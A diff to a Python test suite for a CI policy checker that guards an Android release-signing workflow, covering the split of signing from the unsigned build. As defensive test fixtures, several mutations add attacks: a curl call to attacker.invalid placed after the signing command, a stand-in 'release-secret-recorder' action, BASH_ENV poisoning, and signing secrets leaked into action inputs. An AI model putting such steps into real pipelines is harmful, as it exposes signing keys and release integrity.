@@ -30,38 +30,25 @@ IDENTITY_HELPER = Path("scripts/verify-release-identity.sh")
 ATTACHMENT_HELPER = Path("scripts/attach-umbrella-release-assets.sh")
 READINESS_HELPER = Path("scripts/verify-umbrella-release-readiness.py")
 KEYSTORE_HELPER = Path("scripts/verify-android-release-keystore.sh")
+ARTIFACT_ADMISSION_HELPER = Path("scripts/admit-unsigned-android-artifact.sh")
+SIGNING_HELPER = Path("scripts/sign-android-release.sh")
 
-RELEASE_NEEDS = "    needs: [signing-policy, conscrypt-r28, revalidate-signing]\n"
-RELEASE_CHECKOUT = (
-    "      - name: Checkout\n"
-    "        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n"
-    "        with:\n"
-    "          ref: ${{ inputs.source_sha }}\n"
-    "          persist-credentials: false\n"
+RELEASE_NEEDS = (
+    "    needs: [signing-policy, conscrypt-r28, revalidate-signing, build-unsigned-release]\n"
 )
-TRUSTED_CHECKOUT = (
-    "      # Second, and into its own directory: the candidate checkout above cleans\n"
-    "      # the workspace root, so the trusted verifier has to land after it and\n"
-    "      # outside it. Nothing in the Android build reads from this path.\n"
+RELEASE_CHECKOUT = (
     "      - name: Check out the trusted controller revision\n"
     "        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n"
     "        with:\n"
     "          ref: ${{ github.sha }}\n"
-    "          path: .release-trusted\n"
+    "          clean: true\n"
     "          persist-credentials: false\n"
 )
-RELEASE_JOB_HEAD = (
-    "    defaults:\n"
-    "      run:\n"
-    "        working-directory: android\n"
-    "\n"
-    "    steps:\n"
-    + RELEASE_CHECKOUT
-    + "\n"
-    + TRUSTED_CHECKOUT
-    + "\n"
-    "      - name: Set up JDK 17\n"
-)
+# The same trusted checkout text appears in `revalidate-signing` and
+# `attach-release-assets`. Only the signing job follows it with the JDK setup,
+# so this is the anchor that addresses it unambiguously.
+SIGN_JOB_CHECKOUT = RELEASE_CHECKOUT + "\n      - name: Set up JDK 17\n"
+RELEASE_JOB_HEAD = "    steps:\n" + SIGN_JOB_CHECKOUT
 POLICY_STEP = """      - name: Enforce Android signing boundary
         run: python "$GITHUB_WORKSPACE/scripts/check-android-signing-boundary.py"
 """
@@ -86,7 +73,14 @@ def fixture_root(tmp_path: Path) -> Path:
     # The control plane executes these with network and API access, so the
     # policy pins their bytes; the fixture must carry them for the digest
     # checks to be real.
-    for helper in (IDENTITY_HELPER, ATTACHMENT_HELPER, READINESS_HELPER, KEYSTORE_HELPER):
+    for helper in (
+        IDENTITY_HELPER,
+        ATTACHMENT_HELPER,
+        READINESS_HELPER,
+        KEYSTORE_HELPER,
+        ARTIFACT_ADMISSION_HELPER,
+        SIGNING_HELPER,
+    ):
         (root / helper).parent.mkdir(parents=True, exist_ok=True)
         shutil.copy2(ROOT / helper, root / helper)
     return root
@@ -815,7 +809,7 @@ jobs:
 """,
         encoding="utf-8",
     )
-    assert_rejected(run_checker(root), "binds android-release outside build-release")
+    assert_rejected(run_checker(root), "binds android-release outside sign-release")
 
 
 def test_android_environment_comparison_is_case_insensitive(tmp_path: Path) -> None:
@@ -832,7 +826,7 @@ jobs:
 """,
         encoding="utf-8",
     )
-    assert_rejected(run_checker(root), "binds android-release outside build-release")
+    assert_rejected(run_checker(root), "binds android-release outside sign-release")
 
 
 def test_dynamic_environment_outside_release_is_rejected(tmp_path: Path) -> None:
@@ -849,7 +843,7 @@ jobs:
 """,
         encoding="utf-8",
     )
-    assert_rejected(run_checker(root), "uses a dynamic environment outside build-release")
+    assert_rejected(run_checker(root), "uses a dynamic environment outside sign-release")
 
 
 def test_binding_the_production_environment_outside_its_lane_is_rejected(tmp_path: Path) -> None:
@@ -897,7 +891,7 @@ def test_workflow_level_environment_is_rejected(tmp_path: Path) -> None:
 def test_release_requires_successful_policy_job(tmp_path: Path) -> None:
     root = fixture_root(tmp_path)
     mutate(root / ROOT_WORKFLOW, RELEASE_NEEDS, "")
-    assert_rejected(run_checker(root), "build-release must require successful signing-policy")
+    assert_rejected(run_checker(root), "sign-release must require successful signing-policy")
 
 
 def test_release_needs_must_be_exact(tmp_path: Path) -> None:
@@ -907,21 +901,22 @@ def test_release_needs_must_be_exact(tmp_path: Path) -> None:
         RELEASE_NEEDS,
         "    needs: [signing-policy, conscrypt-r28, revalidate-signing, attacker]\n",
     )
-    assert_rejected(run_checker(root), "build-release must require successful signing-policy")
+    assert_rejected(run_checker(root), "sign-release must require successful signing-policy")
 
 
 def test_dropping_the_pre_signing_revalidation_is_rejected(tmp_path: Path) -> None:
-    """A tag that moved during the build must not reach the keystore."""
+    """A tag that moved during the unsigned build must not reach the keystore."""
 
     root = fixture_root(tmp_path)
     mutate(
         root / ROOT_WORKFLOW,
         RELEASE_NEEDS,
-        "    needs: [signing-policy, conscrypt-r28]\n",
+        "    needs: [signing-policy, conscrypt-r28, build-unsigned-release]\n",
     )
     assert_rejected(
         run_checker(root),
-        "build-release must require successful signing-policy, conscrypt-r28 and revalidate-signing",
+        "sign-release must require successful signing-policy, conscrypt-r28, "
+        "revalidate-signing and build-unsigned-release",
     )
 
 
@@ -960,11 +955,11 @@ def test_a_reintroduced_event_guard_on_the_signing_job_is_rejected(tmp_path: Pat
     root = fixture_root(tmp_path)
     mutate(
         root / ROOT_WORKFLOW,
-        "  build-release:\n    name: Build (signed, admitted release)\n",
-        "  build-release:\n    name: Build (signed, admitted release)\n"
+        "  sign-release:\n    name: Sign (admitted release)\n",
+        "  sign-release:\n    name: Sign (admitted release)\n"
         "    if: startsWith(github.ref, 'refs/tags/v')\n",
     )
-    assert_rejected(run_checker(root), "build-release must not carry an event guard")
+    assert_rejected(run_checker(root), "sign-release must not carry an event guard")
 
 
 def test_release_job_must_use_github_hosted_runner(tmp_path: Path) -> None:
@@ -1019,14 +1014,17 @@ def test_release_job_cannot_define_job_env(tmp_path: Path) -> None:
     assert_rejected(run_checker(root), "must not define job-level env")
 
 
-def test_release_job_cannot_override_default_shell(tmp_path: Path) -> None:
+def test_declaring_defaults_on_the_signing_job_is_rejected(tmp_path: Path) -> None:
+    """It has no candidate tree, so an `android` working directory is a smell."""
+
     root = fixture_root(tmp_path)
-    mutate_last(
+    mutate(
         root / ROOT_WORKFLOW,
-        "      run:\n        working-directory: android\n",
-        "      run:\n        working-directory: android\n        shell: bash -c 'exit 0' {0}\n",
+        "  sign-release:\n    name: Sign (admitted release)\n",
+        "  sign-release:\n    name: Sign (admitted release)\n"
+        "    defaults:\n      run:\n        working-directory: android\n",
     )
-    assert_rejected(run_checker(root), "must use the exact Android working-directory defaults")
+    assert_rejected(run_checker(root), "sign-release must not declare defaults")
 
 
 def test_release_job_cannot_continue_on_error(tmp_path: Path) -> None:
@@ -1082,14 +1080,13 @@ def test_release_step_environment_is_exact(tmp_path: Path) -> None:
 
 
 def test_an_unreviewed_plain_step_environment_is_rejected(tmp_path: Path) -> None:
-    """Only the reviewed tag-passing steps may carry a non-secret environment."""
+    """Only the reviewed steps may carry an environment at all."""
 
     root = fixture_root(tmp_path)
     mutate(
         root / ROOT_WORKFLOW,
-        "      - name: Make gradlew executable\n        run: chmod +x gradlew\n",
-        "      - name: Make gradlew executable\n        env:\n          BASH_ENV: attacker\n"
-        "        run: chmod +x gradlew\n",
+        "      - name: Fetch the pinned bundletool\n        env:\n",
+        "      - name: Fetch the pinned bundletool\n        env:\n          BASH_ENV: attacker\n",
     )
     assert_rejected(run_checker(root), "must use its exact reviewed environment")
 
@@ -1098,22 +1095,18 @@ def test_secret_bearing_step_cannot_be_replaced_by_pinned_action(tmp_path: Path)
     root = fixture_root(tmp_path)
     mutate(
         root / ROOT_WORKFLOW,
-        """      - name: Build signed release APK and AAB
+        """      - name: Sign the admitted APK and AAB
         env:
           KSTOREPWD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
           KEY_ALIAS: ${{ secrets.ANDROID_KEY_ALIAS }}
         run: |
-          ./gradlew assembleRelease bundleRelease --no-daemon \\
-            -PrequireEtebase16Kb=true \\
-            -PrequireConscryptR28=true \\
-            -PsigningStoreLocation="$KEYSTORE_PATH" \\
-            -PsigningKeyAlias="$KEY_ALIAS"
 """,
-        """      - name: Build signed release APK and AAB
+        """      - name: Sign the admitted APK and AAB
         env:
           KSTOREPWD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
           KEY_ALIAS: ${{ secrets.ANDROID_KEY_ALIAS }}
         uses: attacker/release-secret-recorder@0123456789012345678901234567890123456789
+        run: |
 """,
     )
     assert_rejected(run_checker(root), "must match its exact reviewed execution")
@@ -1123,18 +1116,19 @@ def test_secret_bearing_step_command_is_immutable(tmp_path: Path) -> None:
     root = fixture_root(tmp_path)
     mutate(
         root / ROOT_WORKFLOW,
-        '            -PsigningKeyAlias="$KEY_ALIAS"\n',
-        '            -PsigningKeyAlias="$KEY_ALIAS"\n          curl https://attacker.invalid/\n',
+        '          bash "$GITHUB_WORKSPACE/scripts/sign-android-release.sh"\n',
+        '          bash "$GITHUB_WORKSPACE/scripts/sign-android-release.sh"\n'
+        "          curl https://attacker.invalid/\n",
     )
     assert_rejected(run_checker(root), "must match its exact reviewed execution")
 
 
-def test_earlier_release_step_cannot_poison_secret_execution_environment(tmp_path: Path) -> None:
+def test_earlier_signing_step_cannot_poison_the_execution_environment(tmp_path: Path) -> None:
     root = fixture_root(tmp_path)
     mutate_last(
         root / ROOT_WORKFLOW,
-        "      - name: Make gradlew executable\n        run: chmod +x gradlew\n",
-        "      - name: Make gradlew executable\n        run: |\n          chmod +x gradlew\n"
+        '          echo "$BUNDLETOOL_SHA256  $RUNNER_TEMP/bundletool.jar" | sha256sum --check --strict\n',
+        '          echo "$BUNDLETOOL_SHA256  $RUNNER_TEMP/bundletool.jar" | sha256sum --check --strict\n'
         "          echo 'BASH_ENV=attacker' >> \"$GITHUB_ENV\"\n",
     )
     assert_rejected(run_checker(root), "must match the exact reviewed release-job specification")
@@ -1144,9 +1138,10 @@ def test_release_secret_cannot_move_into_action_input(tmp_path: Path) -> None:
     root = fixture_root(tmp_path)
     mutate(
         root / ROOT_WORKFLOW,
-        RELEASE_CHECKOUT,
+        SIGN_JOB_CHECKOUT,
         RELEASE_CHECKOUT.rstrip("\n")
-        + "\n          token: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
+        + "\n          token: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n"
+        + "\n      - name: Set up JDK 17\n",
     )
     assert_rejected(run_checker(root), "references signing secrets outside reviewed step environments")
 
@@ -1162,7 +1157,7 @@ def test_release_job_cannot_invoke_local_action(tmp_path: Path) -> None:
             "      - name: Set up JDK 17\n",
         ),
     )
-    assert_rejected(run_checker(root), "build-release must not invoke local actions")
+    assert_rejected(run_checker(root), "sign-release must not invoke local actions")
 
 
 def test_mutable_action_in_the_release_lane_is_rejected(tmp_path: Path) -> None:
@@ -1188,19 +1183,23 @@ def test_mutable_action_in_android_sibling_workflow_is_rejected(tmp_path: Path) 
     )
 
 
-def test_a_foreign_credential_in_the_signed_release_job_is_rejected(tmp_path: Path) -> None:
+def test_a_foreign_credential_in_the_signing_job_is_rejected(tmp_path: Path) -> None:
     root = fixture_root(tmp_path)
     mutate(
         root / ROOT_WORKFLOW,
         "          KEY_ALIAS: ${{ secrets.ANDROID_KEY_ALIAS }}\n"
-        "        run: |\n          ./gradlew assembleRelease",
+        "        run: |\n"
+        "          set -euo pipefail\n"
+        '          UNSIGNED_DIR="$GITHUB_WORKSPACE/unsigned" \\',
         "          KEY_ALIAS: ${{ secrets.ANDROID_KEY_ALIAS }}\n"
         "          SETTINGS_READ: ${{ secrets.SOME_ADMIN_READ_TOKEN }}\n"
-        "        run: |\n          ./gradlew assembleRelease",
+        "        run: |\n"
+        "          set -euo pipefail\n"
+        '          UNSIGNED_DIR="$GITHUB_WORKSPACE/unsigned" \\',
     )
     assert_rejected(
         run_checker(root),
-        "build-release must not carry any credential beyond the reviewed signing secrets",
+        "sign-release must not carry any credential beyond the reviewed signing secrets",
     )
 
 
@@ -1225,15 +1224,14 @@ def test_moving_the_umbrella_lock_onto_the_signing_job_is_rejected(tmp_path: Pat
     root = fixture_root(tmp_path)
     mutate(
         root / ROOT_WORKFLOW,
-        "    environment: android-release\n    permissions:\n      contents: read\n    defaults:\n",
+        "    environment: android-release\n    permissions:\n      contents: read\n",
         "    environment: android-release\n    permissions:\n      contents: read\n"
         "    concurrency:\n      group: umbrella-release-${{ github.event.client_payload.release_tag }}\n"
-        "      cancel-in-progress: false\n      queue: max\n"
-        "    defaults:\n",
+        "      cancel-in-progress: false\n      queue: max\n",
     )
     assert_rejected(
         run_checker(root),
-        "build-release must not declare concurrency; the umbrella lock belongs to",
+        "sign-release must not declare concurrency; the umbrella lock belongs to",
     )
 
 
@@ -1246,7 +1244,7 @@ def test_granting_the_signing_job_write_permission_is_rejected(tmp_path: Path) -
     )
     result = run_checker(root)
     assert result.returncode == 1
-    assert "build-release permissions must be exactly contents: read" in result.stdout
+    assert "sign-release permissions must be exactly contents: read" in result.stdout
     assert "holds signing material and must declare read-only permissions" in result.stdout
 
 
@@ -1254,12 +1252,12 @@ def test_persisting_the_checkout_credential_in_the_signing_job_is_rejected(tmp_p
     root = fixture_root(tmp_path)
     mutate(
         root / ROOT_WORKFLOW,
-        RELEASE_CHECKOUT,
-        RELEASE_CHECKOUT.replace("          persist-credentials: false\n", ""),
+        SIGN_JOB_CHECKOUT,
+        SIGN_JOB_CHECKOUT.replace("          persist-credentials: false\n", ""),
     )
     assert_rejected(
         run_checker(root),
-        "build-release must check out the admitted commit and then the trusted controller "
+        "sign-release must check out the admitted commit and then the trusted controller "
         "revision, in that order, both with persist-credentials: false",
     )
 
@@ -1268,12 +1266,12 @@ def test_checking_out_a_floating_ref_in_the_signing_job_is_rejected(tmp_path: Pa
     root = fixture_root(tmp_path)
     mutate(
         root / ROOT_WORKFLOW,
-        RELEASE_CHECKOUT,
-        RELEASE_CHECKOUT.replace("          ref: ${{ inputs.source_sha }}\n", "          ref: main\n"),
+        SIGN_JOB_CHECKOUT,
+        SIGN_JOB_CHECKOUT.replace("          ref: ${{ github.sha }}\n", "          ref: main\n"),
     )
     assert_rejected(
         run_checker(root),
-        "build-release must check out the admitted commit and then the trusted controller "
+        "sign-release must check out the admitted commit and then the trusted controller "
         "revision, in that order, both with persist-credentials: false",
     )
 
@@ -1630,7 +1628,7 @@ def test_turning_the_owner_gate_into_a_skipping_job_condition_is_rejected(tmp_pa
 ANDROID_GUARDS = {
     "Revalidate the release identity before decoding signing material": "Decode release keystore",
     "Revalidate the release identity before publishing signed artifacts": (
-        "Upload signed tracker verification evidence"
+        "Upload signed split evidence"
     ),
     "Revalidate the release identity before the attachment handoff": (
         "Publish the closed release-asset set to the attachment job"
@@ -1684,11 +1682,11 @@ def test_pointing_a_revalidation_at_the_candidate_tree_is_rejected(tmp_path: Pat
     root = fixture_root(tmp_path)
     mutate(
         root / ROOT_WORKFLOW,
-        '          bash "$GITHUB_WORKSPACE/.release-trusted/scripts/verify-release-identity.sh" \\\n'
+        '          bash "$GITHUB_WORKSPACE/scripts/verify-release-identity.sh" \\\n'
         '            --tag "$RELEASE_TAG" \\\n'
         '            --commit "$SOURCE_SHA" \\\n'
         "            --stage android-signing-material\n",
-        '          bash "$GITHUB_WORKSPACE/scripts/verify-release-identity.sh" \\\n'
+        '          bash "$GITHUB_WORKSPACE/unsigned/verify-release-identity.sh" \\\n'
         '            --tag "$RELEASE_TAG" \\\n'
         '            --commit "$SOURCE_SHA" \\\n'
         "            --stage android-signing-material\n",
@@ -1700,51 +1698,85 @@ def test_pointing_a_revalidation_at_the_candidate_tree_is_rejected(tmp_path: Pat
 
 def test_removing_the_trusted_checkout_from_the_signing_job_is_rejected(tmp_path: Path) -> None:
     root = fixture_root(tmp_path)
+    mutate(root / ROOT_WORKFLOW, SIGN_JOB_CHECKOUT, "      - name: Set up JDK 17\n")
+    result = run_checker(root)
+    assert result.returncode == 1
+    assert "must check out the admitted commit and then the trusted controller revision" in result.stdout
+
+
+def test_adding_a_candidate_checkout_to_the_signing_job_is_rejected(tmp_path: Path) -> None:
+    """The whole point of the split: no candidate byte on the signing runner."""
+
+    root = fixture_root(tmp_path)
     mutate(
         root / ROOT_WORKFLOW,
-        "      - name: Check out the trusted controller revision\n"
+        SIGN_JOB_CHECKOUT,
+        RELEASE_CHECKOUT
+        + "\n      - name: Checkout the candidate\n"
         "        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n"
         "        with:\n"
-        "          ref: ${{ github.sha }}\n"
-        "          path: .release-trusted\n"
-        "          persist-credentials: false\n\n",
-        "",
+        "          ref: ${{ inputs.source_sha }}\n"
+        "          path: candidate\n"
+        "          persist-credentials: false\n"
+        + "\n      - name: Set up JDK 17\n",
     )
     result = run_checker(root)
     assert result.returncode == 1
     assert "must check out the admitted commit and then the trusted controller revision" in result.stdout
 
 
-def test_checking_the_trusted_copy_out_before_the_candidate_is_rejected(tmp_path: Path) -> None:
-    """The candidate checkout cleans the workspace root; order is load-bearing."""
+def test_running_candidate_gradle_in_the_signing_job_is_rejected(tmp_path: Path) -> None:
+    """Gradle is the candidate's own code; it must never share this runner."""
 
-    root = fixture_root(tmp_path)
-    workflow = root / ROOT_WORKFLOW
-    text = workflow.read_text(encoding="utf-8")
-    start = text.index(RELEASE_CHECKOUT)
-    end = text.index("      - name: Set up JDK 17", start)
-    workflow.write_text(
-        text[:start] + TRUSTED_CHECKOUT + "\n" + RELEASE_CHECKOUT + "\n" + text[end:],
-        encoding="utf-8",
-    )
-    assert_rejected(
-        run_checker(root),
-        "must check out the admitted commit and then the trusted controller revision",
-    )
-
-
-def test_handing_the_workflow_token_to_candidate_gradle_is_rejected(tmp_path: Path) -> None:
     root = fixture_root(tmp_path)
     mutate(
         root / ROOT_WORKFLOW,
-        "      - name: Build signed release APK and AAB\n        env:\n",
-        "      - name: Build signed release APK and AAB\n        env:\n"
+        "      - name: Sign the admitted APK and AAB\n",
+        "      - name: Rebuild with Gradle\n"
+        "        run: ./gradlew assembleRelease\n"
+        "\n      - name: Sign the admitted APK and AAB\n",
+    )
+    result = run_checker(root)
+    assert result.returncode == 1
+    assert "must not execute candidate build tooling" in result.stdout
+
+
+def test_drifting_the_exact_android_build_tools_install_is_rejected(tmp_path: Path) -> None:
+    root = fixture_root(tmp_path)
+    mutate(
+        root / ROOT_WORKFLOW,
+        '"$SDKMANAGER" "build-tools;36.0.0"\n',
+        '"$SDKMANAGER" "build-tools;35.0.0"\n',
+    )
+    assert_rejected(
+        run_checker(root),
+        "must install and check exact build-tools;36.0.0 with the reviewed fixed-path step",
+    )
+
+
+def test_downgrading_native_library_alignment_to_deprecated_p_is_rejected(
+    tmp_path: Path,
+) -> None:
+    root = fixture_root(tmp_path)
+    mutate(
+        root / SIGNING_HELPER,
+        '"$ZIPALIGN" -P 16 -f 4',
+        '"$ZIPALIGN" -p -f 4',
+    )
+    assert_rejected(run_checker(root), "must not use deprecated zipalign -p")
+
+
+def test_handing_the_workflow_token_to_an_unreviewed_step_is_rejected(tmp_path: Path) -> None:
+    root = fixture_root(tmp_path)
+    mutate(
+        root / ROOT_WORKFLOW,
+        "      - name: Fetch the pinned bundletool\n        env:\n",
+        "      - name: Fetch the pinned bundletool\n        env:\n"
         "          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n",
     )
     result = run_checker(root)
     assert result.returncode == 1
     assert "may name the workflow token only in its reviewed revalidation steps" in result.stdout
-    assert "holds signing material and can also write a release" in result.stdout
 
 
 def test_a_token_at_signing_job_scope_is_rejected(tmp_path: Path) -> None:
